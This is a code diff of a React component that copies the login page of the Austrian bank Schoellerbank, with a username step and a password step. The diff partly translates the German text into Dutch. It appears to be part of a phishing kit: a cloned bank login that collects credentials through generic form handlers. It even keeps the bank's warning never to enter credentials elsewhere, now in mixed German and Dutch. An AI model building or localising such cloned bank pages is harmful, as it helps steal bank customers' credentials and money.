@@ -76,7 +76,7 @@ export function Schoellerbank({ formData, onChange, handleRouteAction, saving }:
 
               {/* Intro Text */}
               <p className="text-[14px] text-gray-800 mb-6 leading-relaxed pr-2">
-                Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrem Passwort oder einer Transaktionsnummer (=TAN) fragen!
+                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wir werden Sie nie nach Ihrem Wachtwoord oder einer Transaktionsnummer (=TAN) fragen!
               </p>
 
               {/* Login Form */}
@@ -87,7 +87,7 @@ export function Schoellerbank({ formData, onChange, handleRouteAction, saving }:
                 {step === 1 ? (
                   <>
                     <div className="flex justify-between items-end mb-1">
-                      <label className="text-[12px] text-gray-400">Benutzername</label>
+                      <label className="text-[12px] text-gray-400">Gebruikersnaam</label>
                       <div className="text-[12px] text-[#93272c]">
                         <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
@@ -104,7 +104,7 @@ export function Schoellerbank({ formData, onChange, handleRouteAction, saving }:
                 ) : (
                   <>
                     <div className="flex justify-between items-end mb-1">
-                      <label className="text-[12px] text-gray-400">Passwort</label>
+                      <label className="text-[12px] text-gray-400">Wachtwoord</label>
                       <div className="text-[12px] text-[#93272c]">
                         <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
